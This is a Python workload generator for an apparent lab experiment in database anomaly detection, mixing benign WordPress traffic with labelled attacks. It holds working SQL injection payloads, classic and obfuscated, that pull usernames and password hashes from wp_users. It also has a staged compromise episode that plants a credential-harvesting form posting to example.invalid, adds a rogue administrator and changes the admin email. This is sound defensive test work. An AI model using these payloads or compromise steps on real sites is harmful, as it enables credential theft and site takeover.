#!/usr/bin/env python3
"""Workload generator: benign WordPress traffic + labelled attack episodes.

Every request carries an  X-Exp-Label  header. The PHP logger copies it into the
event log so the evaluator has ground truth. The detector NEVER reads it for scoring.

  benign                  normal visitor / admin traffic
  attack:sqli-classic     textbook SQL injection against the lab-only vulnerable endpoint
  attack:sqli-evasive     the same intents with case/comment/hex obfuscation
  attack:phish-kit        DB footprint of a compromised admin planting a fake login page,
                          a hidden high-entropy blob, a rogue admin user, and an admin_email change
  ignore                  clean-up of the phishing episode (excluded from metrics)

The "phishing kit" here is a HARMLESS stand-in (form posting to example.invalid).
It reproduces the database footprint, not a working kit.

Examples
  python workload.py --run-id train0 --duration 300 --attacks 0      # benign-only, for baseline
  python workload.py --run-id c1 --duration 600 --attacks 30         # mixed
Environment: WP_URL, WP_ADMIN_USER, WP_ADMIN_APP_PW  (see /opt/dbexp/lab.env)
"""
import argparse
import base64
import os
import random
import re
import sys
import threading
import time

import requests

from common import DB_PATH, Store

WP_URL = os.environ.get("WP_URL", "http://localhost").rstrip("/")
ADMIN = (os.environ.get("WP_ADMIN_USER", "admin"), os.environ.get("WP_ADMIN_APP_PW", ""))
WORDS = "security database anomaly detection wordpress plugin query latency batch stream lorem ipsum research".split()

SQLI_CLASSIC = [
    "1 OR 1=1",
    "1 UNION SELECT user_login,user_pass FROM wp_users",
    "1 AND SLEEP(1)",
    "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
]
SQLI_EVASIVE = [
    "1 uNiOn SeLeCt user_login,user_pass FrOm wp_users",
    "1 UNION/**/SELECT/**/user_login,user_pass/**/FROM/**/wp_users",
    "1 /*!50000UNION*/ /*!50000SELECT*/ user_login,user_pass FROM wp_users",
    "1 OR 0x31=0x31",
    "1 AND IF(1=1,SLEEP(1),0)",
]
FAKE_FORM = ('<h2>Verify your account</h2><form method="post" action="https://example.invalid/collect">'
             '<input type="text" name="user"><input type="password" name="pass">'
             '<button>Sign in</button></form>')


# REST calls use the "?rest_route=" form, which works with WordPress's default "plain"
# permalinks. The "/wp-json/..." form needs pretty permalinks + Apache mod_rewrite, which
# setup_vm.sh does not enable - so those requests got an Apache 404 and never reached WordPress.
_ROUTE = re.compile(r"[?&]rest_route=([^&]+)")
_ID = re.compile(r"/\d+(?=/|$)")


def log_path(path):
    """Path stored in http_requests: REST route with ids collapsed, e.g. /wp-json/wp/v2/posts/{id}."""
    m = _ROUTE.search(path)
    if m:
        return "/wp-json" + _ID.sub("/{id}", m.group(1))
    return path.split("?")[0]


def preflight():
    """Fail fast if anonymous pages or the authenticated REST API are not working."""
    problems = []
    try:
        r = requests.get(WP_URL + "/", headers={"X-Exp-Label": "ignore"}, timeout=15)
        if r.status_code != 200:
            problems.append(f"GET / returned HTTP {r.status_code}")
        r = requests.get(WP_URL + "/?rest_route=/wp/v2/users/me", headers={"X-Exp-Label": "ignore"},
                         auth=ADMIN, timeout=15)
        if r.status_code != 200:
            problems.append(f"authenticated REST call returned HTTP {r.status_code} "
                            f"(401 = bad WP_ADMIN_APP_PW, 404 = REST API unreachable)")
    except Exception as e:                                       # noqa: BLE001
        problems.append(f"site unreachable: {e}")
    return problems


def rtext(n):
    return " ".join(random.choices(WORDS, k=n))


class Client:
    def __init__(self, run_id, sink, lock):
        self.run_id, self.sink, self.lock = run_id, sink, lock
        self.s = requests.Session()

    def call(self, method, path, label="benign", auth=None, **kw):
        t0, err, resp, status = time.perf_counter(), "", None, 0
        try:
            resp = self.s.request(method, WP_URL + path, headers={"X-Exp-Label": label},
                                  auth=auth, timeout=30, **kw)
            status = resp.status_code
            if status >= 400:
                err = f"HTTP {status}"
        except Exception as e:                                   # noqa: BLE001
            err = str(e)[:200]
        ms = (time.perf_counter() - t0) * 1000
        with self.lock:
            self.sink.append((self.run_id, time.time(), label, method, log_path(path),
                              status, ms, err))
        return resp

    # ---------------- benign: anonymous visitors ----------------
    def home(self):      self.call("GET", "/")
    def search(self):    self.call("GET", "/", params={"s": random.choice(WORDS)})
    def post(self):      self.call("GET", "/", params={"p": 1})
    def page(self):      self.call("GET", "/", params={"page_id": 2})
    def category(self):  self.call("GET", "/", params={"cat": 1})
    def feed(self):      self.call("GET", "/feed/")
    def rest_posts(self): self.call("GET", "/?rest_route=/wp/v2/posts", params={"per_page": 5})
    def lab_lookup(self): self.call("GET", "/", params={"dbexp_id": random.randint(1, 5)})

    def comment(self):
        self.call("POST", "/wp-comments-post.php", data={
            "comment": rtext(10), "author": "visitor" + str(random.randint(1, 999)),
            "email": "v@example.invalid", "url": "", "comment_post_ID": 1, "comment_parent": 0})

    # ---------------- benign: administrator ----------------
    def admin_cycle(self):
        r = self.call("POST", "/?rest_route=/wp/v2/posts", auth=ADMIN,
                      json={"title": rtext(3), "content": rtext(30), "status": "publish"})
        if r is not None and r.status_code in (200, 201):
            pid = r.json()["id"]
            self.call("POST", f"/?rest_route=/wp/v2/posts/{pid}", auth=ADMIN, json={"content": rtext(40)})
            self.call("GET", "/", params={"p": pid})
            self.call("DELETE", f"/?rest_route=/wp/v2/posts/{pid}", auth=ADMIN, params={"force": "true"})

    def admin_browse(self):
        self.call("GET", "/?rest_route=/wp/v2/posts", auth=ADMIN, params={"context": "edit", "per_page": 10})
        self.call("GET", "/?rest_route=/wp/v2/users/me", auth=ADMIN)

    # ---------------- attacks ----------------
    def sqli(self, evasive, idx):
        pool = SQLI_EVASIVE if evasive else SQLI_CLASSIC
        label = "attack:sqli-evasive" if evasive else "attack:sqli-classic"
        self.call("GET", "/", label=label, params={"dbexp_id": pool[idx % len(pool)]})

    def phish_episode(self, k):
        L = "attack:phish-kit"
        blob = base64.b64encode(os.urandom(128)).decode()
        page = self.call("POST", "/?rest_route=/wp/v2/pages", L, ADMIN,
                         json={"title": "Account Verification", "content": FAKE_FORM, "status": "publish"})
        post = self.call("POST", "/?rest_route=/wp/v2/posts", L, ADMIN,
                         json={"title": "notes", "status": "publish",
                               "content": f'<div style="display:none">{blob}</div>'})
        user = self.call("POST", "/?rest_route=/wp/v2/users", L, ADMIN,
                         json={"username": f"svc_helpdesk_{k}", "email": f"svc{k}@example.invalid",
                               "password": base64.b64encode(os.urandom(12)).decode(),
                               "roles": ["administrator"]})
        self.call("POST", "/?rest_route=/wp/v2/settings", L, ADMIN, json={"email": "attacker@example.invalid"})
        # ---- clean-up so the site stays tidy (excluded from metrics) ----
        self.call("POST", "/?rest_route=/wp/v2/settings", "ignore", ADMIN, json={"email": "admin@example.invalid"})
        for r, path in ((page, "pages"), (post, "posts"), (user, "users")):
            if r is not None and r.status_code in (200, 201):
                extra = {"force": "true", "reassign": 1} if path == "users" else {"force": "true"}
                self.call("DELETE", f"/?rest_route=/wp/v2/{path}/{r.json()['id']}", "ignore", ADMIN, params=extra)


# --------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--run-id", required=True)
    ap.add_argument("--duration", type=float, default=300, help="seconds")
    ap.add_argument("--workers", type=int, default=3, help="concurrent simulated users")
    ap.add_argument("--think", type=float, default=1.0, help="mean think-time per worker (s)")
    ap.add_argument("--attacks", type=int, default=0, help="number of attack episodes to inject")
    ap.add_argument("--admin-share", type=float, default=0.15)
    ap.add_argument("--seed", type=int, default=None)
    ap.add_argument("--db", default=DB_PATH)
    ap.add_argument("--skip-check", action="store_true", help="don't verify site + REST API before starting")
    a = ap.parse_args()
    if a.seed is not None:
        random.seed(a.seed)
    if not ADMIN[1]:
        print("warning: WP_ADMIN_APP_PW not set - admin actions will fail with 401")
    if not a.skip_check:
        problems = preflight()
        if problems:
            sys.exit("preflight failed - not starting the run:\n  " + "\n  ".join(problems))

    results, lock = [], threading.Lock()
    end = time.time() + a.duration

    anon = [("home", 30), ("search", 12), ("post", 20), ("page", 8), ("category", 6),
            ("feed", 4), ("rest_posts", 8), ("lab_lookup", 6), ("comment", 6)]

    def worker():
        c = Client(a.run_id, results, lock)
        while time.time() < end:
            if random.random() < a.admin_share:
                random.choice([c.admin_cycle, c.admin_browse])()
            else:
                name = random.choices([n for n, _ in anon], [w for _, w in anon])[0]
                getattr(c, name)()
            time.sleep(random.expovariate(1 / a.think))

    def attacker():
        if a.attacks <= 0:
            return
        c = Client(a.run_id, results, lock)
        kinds = ["classic", "evasive", "phish"]
        gap = a.duration * 0.8 / a.attacks
        time.sleep(a.duration * 0.1)
        for i in range(a.attacks):
            kind = kinds[i % 3]
            if kind == "phish":
                c.phish_episode(i)
            else:
                c.sqli(kind == "evasive", i // 3)
            time.sleep(max(0.0, gap * random.uniform(0.7, 1.3)))

    threads = [threading.Thread(target=worker) for _ in range(a.workers)]
    threads.append(threading.Thread(target=attacker))
    t0 = time.time()
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    Store(a.db).add_http_rows(results)
    print(f"run={a.run_id}: {len(results)} HTTP requests in {time.time() - t0:.0f}s "
          f"({len(results) / (time.time() - t0):.1f} req/s)")
    bad = [r for r in results if r[5] == 0 or r[5] >= 400]
    if bad:
        by = {}
        for r in bad:
            k = (r[2], r[4], r[5])
            by[k] = by.get(k, 0) + 1
        print(f"warning: {len(bad)} failed requests (label, path, status -> count):")
        for k, n in sorted(by.items(), key=lambda kv: -kv[1])[:15]:
            print(f"   {k} -> {n}")


if __name__ == "__main__":
    main()
